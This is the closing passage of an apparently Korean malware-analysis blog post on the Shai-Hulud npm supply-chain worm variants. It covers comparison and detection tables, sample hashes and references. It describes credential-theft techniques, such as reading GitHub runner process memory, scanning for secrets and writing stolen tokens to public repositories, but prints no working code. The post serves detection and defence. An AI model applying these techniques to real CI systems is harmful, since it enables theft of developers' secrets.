| 데이터 보호 | Base64, 암호화 없음 | Base64, 암호화 없음 | AES-GCM + RSA; 별도 공개 토큰 필드 예외 |
| 수집값 재사용 | 초기 npm 토큰 전파와 TruffleHog는 별도 | Actions의 npm 토큰, 공개 저장소의 GitHub 토큰 | 패턴이 등록된 수집 결과의 토큰, commit의 GitHub 토큰 |

후속 사례를 단순히 “더 많은 키를 훔친다”로 묶기보다는, **수집 결과가 다음 인증·전파 단계에 어떻게 연결되는가**를 보면 차이가 선명해집니다. 범위가 넓어졌어도 권한 부족이나 결과 누적 오류 때문에 실제 전송 내용이 제한될 수 있다는 점도 함께 봐야 합니다.

## 탐지 관점: 설치 프로세스가 secret을 읽은 뒤 무엇을 하는가

파일명이나 Bun 사용 여부보다 **설치 진입점 → 자격증명 접근 → 외부 쓰기**를 연결해 확인하는 것이 이 세 샘플에 맞는 검토 기준입니다.

| 관찰할 연결 | 이 글의 코드 근거 | 대조할 자료 |
| --- | --- | --- |
| 새 설치 명령 뒤 인증 파일·홈 디렉터리 접근 | `parseNpmToken()`, TruffleHog, `zo`·`vo` | manifest diff, 부모·자식 프로세스, 파일 접근 기록 |
| 설치 작업에서 secret 저장소 API 호출 | AWS·GCP·Azure 모듈, Mini의 `Do`·`Xo`·`ao`·`$o` | API 감사 기록, 호출 주체·권한·응답 |
| runner가 다른 프로세스 메모리에 접근 | Mini `ko`·`q7` | `sudo`·Python 실행, `Runner.Worker` 대상 `/proc/<pid>/mem` 접근 |
| 새 workflow가 secrets를 파일·로그·외부로 전달 | 원본 `processor.sh`, Second Coming `mq`, Mini `Io` | workflow diff, run·artifact·외부 전송 기록 |
| 설치 뒤 공개 저장소·수집 endpoint에 쓰기 | `makeRepo()`, `dq`, `lr`·`_r` | 저장소 생성, commit·파일 본문, 네트워크 기록 |

특히 GitHub는 코드 저장소인 동시에 **유출 목적지, secret 수집용 실행 환경, 토큰 재사용 출처**로 쓰입니다. 접속 도메인만으로 역할을 판단하기 어렵습니다. `Code Formatter`, `CodeQL`, `Copilot` 같은 이름도 workflow가 읽고 내보내는 데이터를 대신 설명하지 못합니다.

Mini에서는 전송 본문을 확보해도 암호문만 보일 수 있습니다. 반면 별도 `token` 필드·commit message는 복원 가능한 형식일 수 있으므로 구분해야 합니다.

> **피해 판단의 경계:** 악성 파일이 배포본에 포함된 사실, 실제 실행된 사실, secret에 접근한 사실, 외부 쓰기가 성공한 사실은 서로 다른 증거입니다. 정적 코드만으로 특정 조직의 유출 범위나 성공한 전파 수를 계산할 수는 없습니다.

## 정리

세 배포본은 모두 작은 manifest 변경으로 설치 시 실행 경로를 열고, 개발 환경에 이미 있는 권한을 사용합니다. 원본에서는 로컬 토큰과 홈·클라우드 secret 수집이 기본 구조를 보여줍니다. Second Coming은 Actions secret을 회수해 재사용하고, Mini는 runner 메모리와 추가 secret 저장소를 공통 수집 경로에 연결합니다.

이 글에서 가장 중요하게 본 것은 **자격증명의 출처 → 읽는 코드 → 결과를 받는 곳 → 외부 전송 또는 재사용**입니다. 이 연결을 따라가면 긴 번들 전체를 기능별로 나열하지 않아도, 설치 한 번이 어떤 비밀에 접근하게 하는지와 후속 사례의 차이를 설명할 수 있습니다.

## 분석 자료와 Reference

<details>
<summary>샘플 출처·해시·분석 범위</summary>

Original과 Second Coming의 악성 배포본은 DataDog의 고정 commit 아카이브와 추출 파일을 대조한 수집 자료입니다. 각각 42개·259개 파일이 일치했지만, 기준 버전의 원본 tarball 무결성 기록은 보존되지 않았습니다.

- [tinycolor 4.1.1 아카이브](https://github.com/DataDog/malicious-software-packages-dataset/blob/6894a19488438132de460273c09d5fc7944c1a47/samples/npm/compromised_lib/%40ctrl%40tinycolor/4.1.1/2025-09-15-%40ctrl_tinycolor-v4.1.1.zip)
- [AsyncAPI CLI 4.1.3 아카이브](https://github.com/DataDog/malicious-software-packages-dataset/blob/6894a19488438132de460273c09d5fc7944c1a47/samples/npm/compromised_lib/%40asyncapi%40cli/4.1.3/2025-11-24-%40asyncapi_cli-v4.1.3.zip)

Mini의 기준 버전은 npm 무결성 검증 기록이 있고, 악성 배포본은 미러 수집 파일과 공개 payload 해시를 근거로 삼았습니다. 외부 Git 의존성의 payload는 확보하지 못했습니다. 무결성 확인과 정상성 판정은 구분합니다.

```text
bundle.js
SHA-256: 46faab8ab153fae6e80e7cca38eab363075bb524edd79e42269217a083628f09
```

```text
setup_bun.js
SHA-256: a3894003ad1d293ba96d77881ccd2071446dc3f65f434669b49b3da92421901a

bun_environment.js
SHA-256: 62ee164b9b306250c1172583f138c9614139264f889fa99614903c12755468d0
```

```text
index.js
SHA-256: a68dd1e6a6e35ec3771e1f94fe796f55dfe65a2b94560516ff4ac189390dfa1c
```

Second Coming과 Mini의 코드는 문자열·내장 자료를 정적으로 복원한 발췌입니다. 악성 파일 실행, 외부 토큰 사용, C2 통신, 재배포를 재현하지 않았습니다. 전파·지속성·삭제 기능의 상세 구현은 이 글의 자격증명 분석 범위에서 제외했습니다.

</details>

- [캠페인 개요](/posts/shai-hulud-campaign/)
- [Socket: Tinycolor 공급망 침해 조사](https://socket.dev/blog/tinycolor-supply-chain-attack-affects-40-packages)
- [Wiz: Original Shai-Hulud](https://www.wiz.io/blog/shai-hulud-npm-supply-chain-attack)
- [Wiz: Shai-Hulud 2.0](https://www.wiz.io/blog/shai-hulud-2-0-ongoing-supply-chain-attack)
- [Microsoft: Mini Shai Hulud의 AntV 사례](https://www.microsoft.com/en-us/security/blog/2026/05/20/mini-shai-hulud-compromised-antv-npm-packages-enable-ci-cd-credential-theft/)
- [Socket: AntV 패키지 침해](https://www.socket.dev/blog/antv-packages-compromised)
- [npm: lifecycle scripts](https://docs.npmjs.com/cli/v11/using-npm/scripts/)
- [GitHub: workflow의 secrets 제공 조건](https://docs.github.com/en/actions/how-tos/write-workflows/choose-what-workflows-do/use-secrets)

<!-- Author notes: local source directories relative to the capstone workspace.
npm-analysis/output/shai-hulud-blog-sources/01_original_2025-09/samples/01_tinycolor
npm-analysis/output/shai-hulud-blog-sources/02_second_coming_2025-11/samples/03_asyncapi-cli
npm-analysis/output/shai-hulud-blog-sources/03_mini_2026-05/samples/01_antv-adjust
Use meta.json, raw_manifest.json, diff_manifest.json, and diffs_by_file/ as evidence.
Update the publication date when publishing and complete both language versions.
-->
